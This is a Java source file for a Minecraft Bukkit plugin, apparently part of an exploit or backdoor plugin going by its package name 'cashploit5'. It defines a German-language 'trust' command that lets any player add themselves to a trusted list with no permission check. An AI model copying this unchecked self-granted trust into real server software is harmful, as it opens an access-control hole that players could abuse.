package de.cashploit5.command;

import java.util.ArrayList;
import java.util.List;

import org.bukkit.OfflinePlayer;
import org.bukkit.entity.Player;

import de.cashploit5.Main;

public class TrustCommand extends Command {
	
	public TrustCommand() {
		super("trust");
	}
	
	private static List<String> trustedPlayers = new ArrayList<>();
	
	@Override
	public void onCommand(Player p, Command command, String[] args) {
		if(trustedPlayers.contains(p.getUniqueId().toString())) {
			trustedPlayers.remove(p.getUniqueId().toString());
			Main.sendMessage(p, "§cDu bist nun nicht mehr getrusted");
		} else {
			trustedPlayers.add(p.getUniqueId().toString());
			Main.sendMessage(p, "§cDu bist nun getrusted!");
		}
	}
	
	public static List<String> getTrustedPlayers() {
		return trustedPlayers;
	}
}
